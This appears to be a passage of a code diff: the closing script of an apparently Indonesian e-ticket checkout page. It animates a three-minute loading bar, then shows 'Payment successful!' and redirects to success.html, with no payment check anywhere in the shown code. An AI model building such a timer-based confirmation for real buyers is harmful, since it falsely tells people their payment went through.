+requestAnimationFrame(function frame() {
+const elapsed = Math.min(Date.now() - start, LOAD_MS);
+const p = elapsed / LOAD_MS;
+loaderBar.style.width = (p * 100).toFixed(2) + '%';
+loaderPct.textContent = Math.floor(p * 100) + '%';
+loaderTime.textContent = fmt(Math.floor(elapsed / 1000)) + ' / 03:00';
+if (elapsed < LOAD_MS) requestAnimationFrame(frame);
+});
+
+setTimeout(() => {
+clearInterval(statusInt);
+loaderBar.style.width = '100%';
+loaderPct.textContent = '100%';
+loaderTime.textContent = '03:00 / 03:00';
+loaderStatus.style.opacity = '1';
+loaderStatus.textContent = '✅ Pembayaran berhasil! Mengalihkan ke e-ticket…';
+setTimeout(() => {
+redirecting = true;
+window.location.replace('success.html');
+}, 1200);
+}, LOAD_MS);
+});
+
+refreshGate();
+})();
+</script>
+</body>
+</html>
